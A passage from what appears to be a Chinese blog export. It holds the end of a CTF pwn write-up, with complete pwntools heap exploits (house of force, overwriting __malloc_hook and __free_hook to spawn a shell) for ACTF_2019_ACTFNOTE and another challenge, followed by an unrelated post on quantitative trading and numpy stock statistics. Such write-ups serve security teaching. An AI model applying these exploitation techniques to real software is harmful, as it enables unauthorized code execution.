class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;2:puts&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">b&#x27;bin addr &#x27;</span>)</span><br><span class="line">    <span class="comment"># data = int(rl().split()[0])</span></span><br><span class="line">    data = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;content&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过mmap一个堆，我们得到了mmap的堆的地址，就能计算出libc地址</span></span><br><span class="line"><span class="comment">#因为mmap的这个堆靠近libc的地址</span></span><br><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;aaaa&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one = libc_base + gadget[<span class="number">0</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#house of force</span></span><br><span class="line"><span class="comment">#修改top chunk的size为-1，即超级大</span></span><br><span class="line">heap = add(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">top_chunk = heap + <span class="number">0x10</span></span><br><span class="line">leak(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">leak(<span class="string">&#x27;realloc_hook&#x27;</span>,realloc_hook)</span><br><span class="line">leak(<span class="string">&#x27;malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line"><span class="comment">#分配偏移大小的chunk，将top chunk移到了malloc_hook_addr - 0x20处</span></span><br><span class="line">offset = malloc_hook - <span class="number">0x20</span> - top_chunk - <span class="number">0x10</span></span><br><span class="line">add(offset,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#写 realloc_hook 和 malloc_hook</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(one) + p64(realloc_hook+<span class="number">4</span>) </span><br><span class="line">add(<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;2:puts&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="ACTF-2019-ACTFNOTE"><a href="#ACTF-2019-ACTFNOTE" class="headerlink" title="ACTF_2019_ACTFNOTE"></a>ACTF_2019_ACTFNOTE</h2><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/ctf/pwn/ACTF_2019_ACTFNOTE&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>相关结构体：</p>
<img data-src="../images/image-20250410214807265.png" alt="image-20250410214807265" style="zoom: 50%;" />

<p>edit()函数中存在溢出漏洞：</p>
<p><img data-src="/../images/image-20250410215136768.png" alt="image-20250410215136768"></p>
<p>free和show中无漏洞</p>
<p>add()函数如下:</p>
<p><img data-src="/../images/image-20250410215229919.png" alt="image-20250410215229919"></p>
<p><strong>利用思路：</strong></p>
<ul>
<li>通过溢出漏洞改top_chunk的size，为 -1</li>
<li>top_chunk上移至存放指针的结构体，修改结构体中content的指针，实现任意地址读写</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-10 22:00:36</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./ACTF_2019_ACTFNOTE&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;/$ &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;please input note name size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;please input note name: &#x27;</span>,name)</span><br><span class="line">    sa(<span class="string">b&#x27;please input note content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input note id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;please input new note content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input note id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input note id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x17</span>+<span class="string">b&#x27;s&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa\n&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;ds&#x27;</span>)</span><br><span class="line">libc_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x7b61e</span></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>,<span class="string">b&#x27;b\n&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#top chunk上移形成overlap chunk</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">##这里要注意因为程序strdup申请出来的空间是与content重合了</span></span><br><span class="line"><span class="comment">##此处内存不能写，所以这个第三个参数必须为空</span></span><br><span class="line">add(-<span class="number">0x80</span>,p64(free_hook),<span class="string">b&#x27;&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>python量化交易</title>
    <url>/2025/07/04/python%E9%87%8F%E5%8C%96%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="量化交易初识"><a href="#量化交易初识" class="headerlink" title="量化交易初识"></a>量化交易初识</h1><p><img data-src="/../images/image-20250704174239159.png" alt="image-20250704174239159"></p>
<p>量化交易分类：</p>
<p>策略信号：</p>
<ul>
<li>多因子策略</li>
<li>均值回归策略</li>
<li>动量效益策略</li>
<li>二八轮动策略</li>
<li>海归策略</li>
<li>机器学习策略</li>
</ul>
<h1 id="量化交易开发流程"><a href="#量化交易开发流程" class="headerlink" title="量化交易开发流程"></a>量化交易开发流程</h1><ol>
<li>数据获取</li>
<li>数据清洗</li>
<li>策略编写（核心）</li>
<li>策略回测</li>
<li>策略优化（重点）</li>
<li>模拟盘交易</li>
<li>实盘交易（真金白银）</li>
</ol>
<p><strong>数据获取</strong></p>
<p>内容：行情数据、宏观数据、财务数据、舆情数据</p>
<p>方式：网站下载、客户端、三方api、爬虫</p>
<p><strong>数据清洗</strong></p>
<p>场景：垃圾数据清除、空值填充、格式转换、数据对齐</p>
<p>类库：numpy、pandas</p>
<p><strong>策略编写</strong></p>
<p>建仓：买；平仓：卖；策略要判断出交易信号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    A[信号捕捉] --&gt; B[交易];</span><br><span class="line">    B --&gt; C[建仓];</span><br><span class="line">    B --&gt; D[平仓];</span><br></pre></td></tr></table></figure>

<p><strong>策略回测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    A[回测参数设置] --&gt; B[策略实例化];</span><br><span class="line">    B --&gt; C[历史数据加载];</span><br><span class="line">    C --&gt; D[回测执行];</span><br><span class="line">    D --&gt; E[计算统计指标];</span><br><span class="line">    E --&gt; F[生成回测报告];</span><br></pre></td></tr></table></figure>

<p><strong>量化策略优化</strong></p>
<ul>
<li>重视交易费</li>
<li>重视风险，重视退出（止盈线、止损线）</li>
<li>优化无止境（不要无休止得）</li>
</ul>
<p><strong>模拟盘交易</strong></p>
<ul>
<li>过去的表现并不表示未来结果（事后诸葛亮）</li>
<li>至少半年以上</li>
<li>模拟盘交易稳定收益100%以上在考虑实盘交易</li>
</ul>
<p><strong>实盘交易</strong></p>
<ul>
<li>做好第一年会输的准备</li>
<li>不要急于扩大投资，增加杠杆（控制风险）</li>
<li>心态最重要</li>
</ul>
<h2 id="量化交易分类体系"><a href="#量化交易分类体系" class="headerlink" title="量化交易分类体系"></a>量化交易分类体系</h2><h3 id="交易产品分类"><a href="#交易产品分类" class="headerlink" title="交易产品分类"></a>交易产品分类</h3><p>交易产品、盈利模式</p>
<ul>
<li>股票策略，股票——股价波动盈利</li>
<li>期权策略，期权——期权合约差价（常用）、到期行权收益</li>
<li>CTA策略，期货——关注价格趋势获取利差</li>
<li>FOF策略，FOF</li>
</ul>
<h3 id="盈利模式分类"><a href="#盈利模式分类" class="headerlink" title="盈利模式分类"></a>盈利模式分类</h3><ul>
<li>单边多空策略——<strong>低价买</strong>进，带股价出现单边下跌时卖出，赚取利差</li>
<li>套利策略——<strong>金融产品价格与收益略暂时不一致</strong>的机会收益</li>
<li>对冲策略——指特以减低另一项投资风险的<strong>投资</strong>。同时进行两笔<strong>行情相同、方向相关、数量相当、盈亏相抵</strong>的交易</li>
</ul>
<h3 id="策略信号分类"><a href="#策略信号分类" class="headerlink" title="策略信号分类"></a>策略信号分类</h3><p>策略信号就是交易信号</p>
<ul>
<li>多因子——找到某些和收益率最相关的指标，并根据该指标，建一个股票组合，期望该组合在未来的一段时间跑赢（做多）或跑输（做空）指数</li>
</ul>
<p>例：因子项：资产负债率、资产回报率、每股净收益、净利润增长率、市盈率等</p>
<ul>
<li>交易模型——具有普遍性、可盈利可量化可执行的交易系统</li>
<li>机器学习——从大规模数据中找到某种规律，包括但不限于文本数据、<strong>图像数据</strong>等，找到可盈利、可量化、可执行的策略信号。</li>
</ul>
<h1 id="股票"><a href="#股票" class="headerlink" title="股票"></a>股票</h1><p>股票的<strong>交易价格</strong>与股票的<strong>价值</strong>是相对的概念。股票价值的真实含义是<strong>企业资产的价值</strong>。而股票的价值就等于<strong>每股收益</strong>。</p>
<p>影响因素：</p>
<ul>
<li>经济因素——经济繁荣，股价上涨；经济衰退，股价下跌</li>
<li>政治因素</li>
<li>行业因素</li>
<li>企业自身因素</li>
<li>市场因素</li>
<li>心理因素</li>
</ul>
<p>股票的基础知识：自己拿真金白银才能在股市中试出来，通过各种指标读懂散户与主力的情绪、市场和其中的博弈。</p>
<h2 id="量化选股"><a href="#量化选股" class="headerlink" title="量化选股"></a>量化选股</h2><p>选股是股票投资的第一步，选好赚钱选坏亏钱</p>
<p>方法：基本面选股</p>
<p>基本面：通过分析一家上市公司在发展过程中所面临的<strong>外部因素</strong>及<strong>自身的因素</strong>，来预测其未来的发展前景，并以此来判断该上市公司的股票是否值得购买。</p>
<p>外部因素：经济增长、财政策略、利率变化（贷款等）</p>
<p>内部因素：经营状况、行业地位、财务状况</p>
<p>科学的分析方法：估值</p>
<p><strong>股票估值</strong>基本面选股的<strong>核心方法</strong>。股票估值能够帮助投资者发现价值被低估的股票，让他们低买高卖，从而获利。</p>
<p>常用指标：</p>
<ul>
<li><strong>每股收益</strong>：<strong>越高越好</strong>，代表公司盈利水平</li>
<li><strong>市盈率</strong>：14~30倍正常，大于30属于高估，50倍以上存在泡沫</li>
<li><strong>毛利率</strong>：越高越好，大于50%不错</li>
<li><strong>净资产收益率</strong>：代表公司盈利能力，<strong>ROE长期保持在20%以上就是白马股</strong></li>
<li><strong>资产负债率</strong>：适中为好，最好在<strong>10%~40%</strong>。过高，易暴雷；过低，太保守</li>
<li><strong>净利润增速</strong>：代表公司未来成长能力，近三年20以上属优质企业，大于50%属于<strong>成长股</strong></li>
</ul>
<h2 id="择时"><a href="#择时" class="headerlink" title="择时"></a>择时</h2><p>即<strong>买入股票</strong>和<strong>卖出股票</strong>的时机</p>
<p>作用：择时的好坏，决定能够<strong>赚到多少钱</strong></p>
<p>方法：技术分析——K线、成交量、均线、柏林带、MACD、KDJ等<strong>反应股价变化</strong>的指标</p>
<h2 id="量化交易平台"><a href="#量化交易平台" class="headerlink" title="量化交易平台"></a>量化交易平台</h2><p>joinQuant、掘金量化、BigQuant、RiceQuant等</p>
<h1 id="Numpy实战"><a href="#Numpy实战" class="headerlink" title="Numpy实战"></a>Numpy实战</h1><h2 id="股价分析"><a href="#股价分析" class="headerlink" title="股价分析"></a>股价分析</h2><p><strong>一些指标</strong></p>
<p>极差：股价近期最高价的最大值和最小值的插值，</p>
<p>成交量加权平均价格</p>
<p>收益率：简单收益率；对数收益率——之所有价格取对数后两两之间的差值</p>
<p>波动率：波动率：是对价格变动的一种衡量，计算历史波动率需要用到对数收益率</p>
<p>年波动率：对数波动率的标准差除以其均值，再乘以交易日倒数的平方根，通常为250</p>
<p>月波动率：对数收益率的标准差除以其均值，再乘以交易月的平方根，通常为12</p>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestNumpyStock</span>(unittest.TestCase):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    读取指定列</span></span><br><span class="line"><span class="string">    numpy.loadtxt需要传入4个关键字参数：</span></span><br><span class="line"><span class="string">    1.fname是文件名，数据类型为字符串str；</span></span><br><span class="line"><span class="string">    2.delimiter是分隔符，数据类型为字符串str；</span></span><br><span class="line"><span class="string">    3.usecols是读取的列数，数据类型为元组tuple，其中元素个数有多少个，则选出多少列；</span></span><br><span class="line"><span class="string">    4.unpack是是否解包，数据类型为布尔bool。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testReadFile</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        <span class="comment"># 读取股票代码、日期、开盘价、最高价、最低价、收盘价和成交量</span></span><br><span class="line">        end_price,volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>,<span class="number">6</span>),</span><br><span class="line">            unpack=<span class="literal">True</span>,</span><br><span class="line">            <span class="comment"># dtype=str,</span></span><br><span class="line">            skiprows=<span class="number">1</span>  <span class="comment"># 跳过标题行</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># print(end_price)</span></span><br><span class="line">        <span class="comment"># print(volumn)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算最大值与最小值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testMaxAndMin</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        <span class="comment"># 读取最高价和最低价(从第5列开始，索引为4和5)</span></span><br><span class="line">        high_price,low_price = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">3</span>, <span class="number">4</span>),</span><br><span class="line">            <span class="comment">#dtype=float,</span></span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;max_price = <span class="subst">&#123;high_price.<span class="built_in">max</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;min_price = <span class="subst">&#123;low_price.<span class="built_in">min</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算极差</span></span><br><span class="line">    <span class="comment"># 计算股价近期最高价的最大值和最小值的差值 和 计算股价近期最低价的最大值和最小值的差值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testPtp</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        high_price, low_price = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">3</span>, <span class="number">4</span>),</span><br><span class="line">            dtype=<span class="built_in">float</span>,</span><br><span class="line">            skiprows=<span class="number">1</span>,  <span class="comment"># 跳过标题行</span></span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;max - min of high_price = <span class="subst">&#123;np.ptp(high_price)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;max - min of low_price = <span class="subst">&#123;np.ptp(low_price)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算成交量加权平均价格</span></span><br><span class="line">    <span class="comment"># 成交量加权平均价格: 英文名VWAP(Volume-Weighted Average Price，成交量加权平均价格)</span></span><br><span class="line">    <span class="comment"># 是一个非常重要的经济学指标，代表着金融资产的&quot;平均&quot;价格</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testAVG</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price, volume = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>, <span class="number">6</span>),  <span class="comment"># 2: 收盘价(open), 6: 成交量(vol)</span></span><br><span class="line">            dtype=<span class="built_in">float</span>,</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;vg_price = <span class="subst">&#123;np.average(end_price)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;VWAD = <span class="subst">&#123;np.average(end_price,weights=volume)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#计算中位数</span></span><br><span class="line">    <span class="comment">#收盘价的中位数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testMedian</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price, volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>, <span class="number">6</span>),</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;median = <span class="subst">&#123;np.median(end_price)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#计算方差</span></span><br><span class="line">    <span class="comment">#收盘价的方差</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testVar</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price, volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>, <span class="number">6</span>),</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;var = <span class="subst">&#123;np.var(end_price)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#计算股票收益率、年波动率及月波动率</span></span><br><span class="line">    <span class="comment">#收益率：简单收益率；对数收益率——之所有价格取对数后两两之间的差值</span></span><br><span class="line">    <span class="comment">#波动率：是对价格变动的一种衡量，计算历史波动率需要用到对数收益率</span></span><br><span class="line">    <span class="comment">#年波动率：对数波动率的标准差除以其均值，再乘以交易日倒数的平方根，通常为250</span></span><br><span class="line">    <span class="comment">#月波动率：对数收益率的标准差除以其均值，再乘以交易月的平方根，通常为12</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testVolatility</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price, volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>, <span class="number">6</span>),</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment">#对数收益率</span></span><br><span class="line">        log_return = np.diff(np.log(end_price))</span><br><span class="line">        <span class="comment">#年度波动率</span></span><br><span class="line">        annual_volatility = log_return.std() / log_return.mean() * np.sqrt(<span class="number">250</span>)</span><br><span class="line">        <span class="comment">#月度波动率</span></span><br><span class="line">        monthly_volatility = log_return.std() / log_return.mean() * np.sqrt(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;log_return = <span class="subst">&#123;log_return&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;annual_volatility = <span class="subst">&#123;annual_volatility&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;monthly_volatility = <span class="subst">&#123;monthly_volatility&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure>

<h2 id="股价均线"><a href="#股价均线" class="headerlink" title="股价均线"></a>股价均线</h2><p>卷积：可用于描述过去左右对当前的影响。<strong>卷积是时空相应的叠加，可用作计算“滑动平均”</strong></p>
<p>numpy.convolve(a, v, mode&#x3D;’full’)，这是numpy函数中的卷积函数。</p>
<p>参数：</p>
<ul>
<li><p><strong>a</strong>: <code>(N,)</code> 输入的一维数组</p>
</li>
<li><p><strong>b</strong>: <code>(M,)</code> 输入的第三个一维数组</p>
</li>
<li><p><strong>mode</strong>: <code>&#123;‘full’, ‘valid’, ‘same’&#125;</code> 参量可选</p>
<ul>
<li><p><strong>‘full’</strong>: 默认值，返回每一个卷积值，长度是 N + M - 1，在卷积的边缘处，信号不重量，存在边际效应。</p>
</li>
<li><p><strong>‘same’</strong>: 返回的数组长度为 max(M, N)，即原有效应存在。</p>
</li>
<li><p><strong>‘valid’</strong>: 返回的数组长度为 max(M, N) - min(M, N) + 1，此时返回的是完全重量的点，边缘的点无效。</p>
</li>
</ul>
</li>
</ul>
<p><strong>简单移动均线</strong>：一般用于分析时间序列上的股价趋势   计算股价与权重的指标函数的卷积。通过将一段时间内的股票收盘价相加，然后除以时间段的天数来计算。简单移动平均线可以平滑价格波动，显示出长期趋势。</p>
